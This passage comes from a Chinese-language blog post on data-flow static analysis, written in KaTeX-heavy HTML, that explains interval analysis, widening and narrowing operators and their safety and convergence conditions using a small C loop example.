mathnormal">c</span><span class="mclose">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>但是这样构成的半格高度是无限的，而且操作也不能保证单调性，因此提出了改进策略——人为指定上下界。如果下界大于类型的最大值，那么为空值，程序异常；如果下界小于最大值，那么更新下界和上界，其中如果最大值之和和类型最大值取其中小者。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>+</mo><mo stretchy="false">[</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">∅</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>+</mo><mi>c</mi><mo>&gt;</mo><msub><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi></mrow><mo>−</mo></msub><mi>max</mi><mo>⁡</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo fence="true">(</mo><mi>a</mi><mo>+</mo><mi>c</mi><mo separator="true">,</mo><mi>min</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mi>b</mi><mo>+</mo><mi>d</mi><mo separator="true">,</mo><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi></mrow><mi mathvariant="normal">_</mi><mi>max</mi><mo>⁡</mo><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>+</mo><mi>c</mi><mo>≤</mo><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">i</mi><mi mathvariant="normal">n</mi><mi mathvariant="normal">t</mi></mrow><mi mathvariant="normal">_</mi><mi>max</mi><mo>⁡</mo></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\left\{ \begin{matrix}[a,b]+[c,d]=\varnothing&amp;a+c&gt;\mathrm{int}_-\max\\\left( a+c,\min \left( b+d, \mathrm{int}\_\max \right) \right)&amp;a+c\le \,\,\mathrm{int}\_\max \\\end{matrix} \right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.41em;vertical-align:-0.955em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.455em;"><span style="top:-3.615em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">[</span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord amsrm">∅</span></span></span><span style="top:-2.405em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">int</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.955em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.455em;"><span style="top:-3.615em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">int</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2583em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">−</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span></span></span><span style="top:-2.405em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">int</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.955em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h2 id="基础-widening">基础 widening</h2><p>但是这样做的复杂度还是很高，于是可以<strong>通过降低结果的精度来加快收敛速度</strong>。基本的 widening 的方法是<strong>降低格的高度，它的核心是把结果进一步抽象，通过单调函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 把原来的半格映射成新的格，也即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>←</mo><mi>w</mi><mo>∘</mo><mi>f</mi></mrow><annotation encoding="application/x-tex">f\gets w\circ f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></strong>。例如在区间分析中可以预定范围，</p><ul><li>定义有限集合：$$B=\left{ -\infty ,10,20,50,100,+\infty \right}$$</li><li>定义映射函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mi>l</mi><mo separator="true">,</mo><mi>h</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">[</mo><mi>max</mi><mo>⁡</mo><mo stretchy="false">{</mo><mi>i</mi><mo>∈</mo><mi>B</mi><mo>∣</mo><mi>i</mi><mo>≤</mo><mi>l</mi><mo stretchy="false">}</mo><mo separator="true">,</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">{</mo><mi>i</mi><mo>∈</mo><mi>B</mi><mo>∣</mo><mi>h</mi><mo>≤</mo><mi>i</mi><mo stretchy="false">}</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">w([l, h])=[\max \{i \in B \mid i \leq l\}, \min \{i \in B \mid h \leq i\}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">([</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">h</span><span class="mclose">])</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mop">max</span><span class="mopen">{</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span><span class="mopen">{</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">}]</span></span></span></span></li></ul><p>这样就可以把区间 [15, 75]、[11, 89]等等映射成 [10,100]，也即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝑤</mi><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mn>15</mn><mo separator="true">,</mo><mn>75</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">[</mo><mn>10</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">𝑤([15, 75])= [10,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">([</span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">75</span><span class="mclose">])</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。由于状态数大幅减少，所以很大程度上加快了收敛速度。</p><p>再比如，对于如下代码我们比较是否应用基础 widening 的区别：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(input)&#123;</span><br><span class="line">    x = <span class="number">7</span>;</span><br><span class="line">    x = x+<span class="number">1</span>;</span><br><span class="line">    y = y+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充：需要理解什么是交汇的节点，比如循环的入口就是，可以理解为执行路径的交点。</p><p>有限集合为: $$\left{ \mathrm{−}\infty ,0,1,7,+\infty \right} $$，每次循环第二行处的状态如下图所示：</p><img src="https://cdn.blog-blockchain.xyz/202208061953535.png" alt="image-20220806195327364" style="zoom: 67%;" /><h2 id="基础-widening-的安全性和收敛性">基础 widening 的安全性和收敛性</h2><p>安全性需要保证：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊑</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">w(x) \sqsubseteq x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 这是容易确定的，因为原来的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 是单调的，那么构造合适的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 即可。</p><p>收敛性由单调性容易得到保证。</p><h2 id="一般的-widening">一般的 widening</h2><p>基础的 widening 的精度不高，而且精度和收敛速度是不能两全的，但是一般的 widening 方法可以在一定程度上提高性能。一般的 widening 同时<strong>参考更新前和更新后的值来猜测最终会收敛的值</strong>。设 widening 算子 $\nabla $，它是我们自定义的规则。那么推断节点新的值可以表示为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mtext> DATA </mtext><mi mathvariant="normal">v</mi></msub><mo>←</mo><msub><mtext> DATA </mtext><mi mathvariant="normal">v</mi></msub><mi mathvariant="normal">∇</mi><msub><mi mathvariant="normal">f</mi><mi mathvariant="normal">v</mi></msub><mrow><mo fence="true">(</mo><msub><mrow><mi mathvariant="normal">M</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">T</mi></mrow><mi mathvariant="normal">v</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\text { DATA }_{\mathrm{v}} \leftarrow \text { DATA }_{\mathrm{v}} \nabla \mathrm{f}_{\mathrm{v}}\left(\mathrm{MEET}_{\mathrm{v}}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord text"><span class="mord"> DATA </span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord text"><span class="mord"> DATA </span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∇</span><span class="mord"><span class="mord mathrm" style="margin-right:0.07778em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathrm">MEET</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>再次以之前的代码为例，但是我们更改规则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(input)&#123;</span><br><span class="line">    x = <span class="number">7</span>;</span><br><span class="line">    x = x+<span class="number">1</span>;</span><br><span class="line">    y = y+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>节点交汇操作规则如下，其中 T 表示格的最高层的元素</p><img src="https://cdn.blog-blockchain.xyz/202208062203873.png" alt="image-20220806220352816" style="zoom: 67%;" /><p>可以对比分析以上提到的不同的方式：</p><img src="https://cdn.blog-blockchain.xyz/202208062209273.png" alt="image-20220806220958195" style="zoom:67%;" /><h2 id="一般-widening-的安全性和收敛性">一般 widening 的安全性和收敛性</h2><p>为了保证安全性，构造 widening 算子的时候需要注意：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∇</mi><mi>y</mi><mo>⊑</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∧</mo><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∇</mi><mi>y</mi><mo>⊑</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x\nabla y\sqsubseteq x)\land (x\nabla y\sqsubseteq y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><p>但是为了保证收敛性比较麻烦，没有通用的判断方法，因为 widening 算子与变换函数的趋势有关，也无法保证在半格上的单调性。</p><p>这里提及一种不收敛的情况，当多条路径交汇的时候，如果定义的交汇操作时逐个进行的，那么可能由于处理前驱节点的顺序不一样，造成不一样的结果。</p><h2 id="narrowing">narrowing</h2><p>widening 是只产生的区间比实际的区间更加大，而 narrowing 会将区间变小。通过再次<strong>应用原始转换函数对 Widening 的结果进行修正</strong>，narrowing 的方法可以提高 widening 的精度。简单的说，就是在某一步就不采用 widening 的方法，而是用原始的函数。例如下图 x 的值的区间在第 5 步突然缩小了。</p><img src="https://cdn.blog-blockchain.xyz/202208062339439.png" alt="image-20220806233948371" style="zoom: 67%;" /><p>引入 <strong>narrowing 算子</strong> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">Δ</span></span></span></span>：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">A</mi><mi mathvariant="normal">T</mi><mi mathvariant="normal">A</mi></mrow><mi mathvariant="normal">v</mi></msub><mo>←</mo><msub><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">A</mi><mi mathvariant="normal">T</mi><mi mathvariant="normal">A</mi></mrow><mi mathvariant="normal">v</mi></msub><mi mathvariant="normal">Δ</mi><msub><mi mathvariant="normal">f</mi><mi mathvariant="normal">v</mi></msub><mrow><mo fence="true">(</mo><msub><mrow><mi mathvariant="normal">M</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">E</mi><mi mathvariant="normal">T</mi></mrow><mi mathvariant="normal">v</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathrm{DATA} _{\mathrm{v}}\gets \mathrm{DATA}_{\mathrm{v}}\Delta \mathrm{f}_{\mathrm{v}}\left( \mathrm{MEET}_{\mathrm{v}} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">DATA</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">DATA</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">Δ</span><span class="mord"><span class="mord mathrm" style="margin-right:0.07778em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathrm">MEET</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathrm mtight" style="margin-right:0.01389em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>例如算子定义如下，当区间出现无穷时，可以缩小区间。</p><img src="https://cdn.blog-blockchain.xyz/202208092131922.png" alt="image-20220809213119845" style="zoom:50%;" /><h2 id="narrowing-的安全性和收敛性">narrowing 的安全性和收敛性</h2><p>这里核心是需要证明在 widening 基础上再使用 narrowing，也是安全的，保证不会出错。根据前面的定义，初始输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span> 经过任意路径上的多个状态转换函数后得到的值的交集（按照半格顺序取小），会大于交汇操作得到的值。而经过 widening 映射后的新的半格也会满足单调性，并且每个节点的值必须小于初始的的值。按照下图，可以知道即使是从 widening 后的不动点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>G</mi></msub></mrow><annotation encoding="application/x-tex">I_G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 再使用原来的转换函数若干次，得到的值会比 widening 的更小(精确)。</p><img src="https://cdn.blog-blockchain.xyz/202208092116158.png" alt="image-20220809211638060" style="zoom: 67%;" /><p>简单地说，如果算子满足如下条件就是安全的：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>x</mi><mi mathvariant="normal">Δ</mi><mi>y</mi><mo>⊑</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x\Delta y\sqsubseteq y</annotation></semantics></math></span><span 